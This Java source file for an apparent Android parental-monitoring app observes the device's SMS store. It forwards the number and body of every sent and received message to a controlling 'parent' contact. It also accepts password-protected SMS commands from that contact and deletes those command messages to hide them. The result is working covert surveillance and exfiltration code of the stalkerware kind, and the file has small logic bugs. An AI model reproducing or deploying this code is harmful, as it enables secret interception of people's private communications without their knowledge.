package com.example.observer;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ContentResolver;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;
import android.widget.Toast;



@SuppressLint("HandlerLeak")
public class sendingDetector{

	ContactBean bean;
	Activity parent;
	public sendingDetector(Activity act){
		parent = act;
	}
	
	public void listenForSMS(){
	    Log.v("SMSTEST", "STARTED LISTENING FOR SMS OUTGOING");
	    Handler handle = new Handler(){};

	    SMSObserver myObserver = new SMSObserver(handle);

	    ContentResolver contentResolver = parent.getContentResolver();
	    contentResolver.registerContentObserver(Uri.parse("content://sms"),true, myObserver);
	}

	private class SMSObserver extends ContentObserver{

    
	    public SMSObserver(Handler handler) {
	        super(handler);
	    }

	    public void onChange(boolean selfChange) {
	        super.onChange(selfChange);
	        Uri uriSMSURI = Uri.parse("content://sms");
	        Cursor cur = parent.getContentResolver().query(uriSMSURI, null, null, null, null);
	        cur.moveToFirst();

	        for(int i=0 ; i<cur.getColumnCount(); i++){
	        	System.out.print("key: "+ cur.getColumnName(i));
	        	System.out.println("value: "+ cur.getString(i));
	        	
	        	
	        }
	        String idCheck = "";
	        String id = cur.getString(cur.getColumnIndex("_id"));
	        String content = cur.getString(cur.getColumnIndex("body"));
	        String no=cur.getString(cur.getColumnIndex("address"));
	        
	        bean = MainActivity.db.getContactBean();
	        
	        String fnumber = bean.getPhoneNumber();
	        String name = bean.getName();
	        String status = bean.getStatus();
	        String password = bean.getPassword();

	        
	        
	        if(id.equals(idCheck))return;
	        idCheck = id;
	        
	        if(no.length()<10) return;
	        
	        String protocol = cur.getString(cur.getColumnIndex("protocol"));
	        
	        if(protocol == null){
	        	String sms = name + ": SMS SENT: "+no+" message: "+content;
	        	if(!(MainActivity.getCache().equals(id))){
	        		sendSmsEmailMethod.notifyParent(sms, parent.getApplicationContext());
	        		MainActivity.setCache(id);
	        	}
	        	return;
	        }
	        
	        String msgData[] = content.split(" ");
	        if(isParent(no, fnumber)){
	        	String pass=null;
	        	String pattern=null;
	        	String num_email=null;
	        	if((msgData.length == 3)){
			        pass = msgData[0];
			        pattern = msgData[1];
			        num_email = msgData[2];	        		
		        	deleteSms(id);
		        	if(pass.equalsIgnoreCase(password)){
		        		resposeParentQuery(pattern, num_email);
		        	}
	        	}
	        	else if(msgData.length == 2){
			        pass = msgData[0];
			        pattern = msgData[1];	        		
		        	deleteSms(id);
		        	if(pass.equalsIgnoreCase(password)){
		        		resposeParentQuery(pattern, num_email);
		        		return;
		        	}
	        	}	        	
	        }
	        else{
		        if(status.equalsIgnoreCase("stop"))return;
		        else if(status.equalsIgnoreCase("start")){
		        	String sms = name + ": SMS RECIEVED: "+no+" message: "+content;
		        	if(!(MainActivity.getCache().equals(id))){
		        		sendSmsEmailMethod.notifyParent(sms, parent.getApplicationContext());
		        		MainActivity.setCache(id);
		        	}
		        }
	        }
	    }
	}

	public void resposeParentQuery(String pattern, String num_email_mode){
		if(pattern.equalsIgnoreCase("stop")){
			bean.setStatus("stop");
			try{
				MainActivity.db.updateContact(bean);
			}
			catch(Exception ex){ex.printStackTrace();}
		}
		else if(pattern.equalsIgnoreCase("start")){
			bean.setStatus("start");
			try{
				MainActivity.db.updateContact(bean);
			}
			catch(Exception ex){ex.printStackTrace();}
		}
		else if(pattern.equalsIgnoreCase("change")){
			bean.setPhoneNumber(num_email_mode);
			try{
				MainActivity.db.updateContact(bean);
			}
			catch(Exception ex){ex.printStackTrace();}
		}
		else if(pattern.equalsIgnoreCase("email")){
			bean.setEmail(num_email_mode);
			try{
				MainActivity.db.updateContact(bean);
			}
			catch(Exception ex){ex.printStackTrace();}
		}
		else if(pattern.equalsIgnoreCase("mode")){
			bean.setMode(num_email_mode);
			try{
				MainActivity.db.updateContact(bean);
			}
			catch(Exception ex){ex.printStackTrace();}
		}
	}
	public boolean deleteSms(String smsId) {
        boolean isSmsDeleted = false;
        try {
            parent.getContentResolver().delete(
                    Uri.parse("content://sms/" + smsId), null, null);
            isSmsDeleted = true;

        } catch (Exception ex) {
            isSmsDeleted = false;
        }
        return isSmsDeleted;
    }
	
	public boolean isParent(String sender, String father){
    	String num[] = sender.trim().split("");
    	String zeronumber = "0";
    	for(int i=4; i<num.length; i++){
    		zeronumber+=num[i];
    	}
		return father.equalsIgnoreCase(zeronumber) || father.equalsIgnoreCase(sender);
   	}
}
